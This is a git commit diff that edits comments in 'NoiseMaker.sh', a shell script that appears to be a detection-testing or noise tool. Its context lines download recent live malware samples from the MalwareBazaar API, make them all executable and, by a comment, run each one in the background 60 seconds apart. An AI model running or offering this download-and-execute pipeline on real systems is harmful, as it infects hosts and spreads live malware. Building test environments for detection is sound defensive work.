a72e33d4fae326de4101c242eb727e0d687fb320
ciwen3 <55612276+ciwen3@users.noreply.github.com>
2022-02-22 09:36:32 -0800

    Update NoiseMaker.sh

--- Linux/NoiseMaker.sh
+++ Linux/NoiseMaker.sh
@@ -10,7 +10,7 @@ cd ./malware
 wget https://bazaar.abuse.ch/export/txt/sha256/recent > recent
 awk '$1 !~ "#" {print $1}' recent.1 > recent
 
-# all of you virus belong to me
+# all of your virus belong to me
 for i in $(cat recent); do wget --post-data "query=get_file&sha256_hash=$i" https://mb-api.abuse.ch/api/v1/; done
 
 # extract all the virus'
@@ -25,8 +25,7 @@ rm ./recen*
 # make it all executable
 chmod +x ./*
 
-# alternate if sudo is needed
-# uncomment the following line if needed 
+# alternate if sudo is needed uncomment the following line
 # sudo chmod +x ./*
 
 # run each virus 60 seconds apart and background the process in a subshell
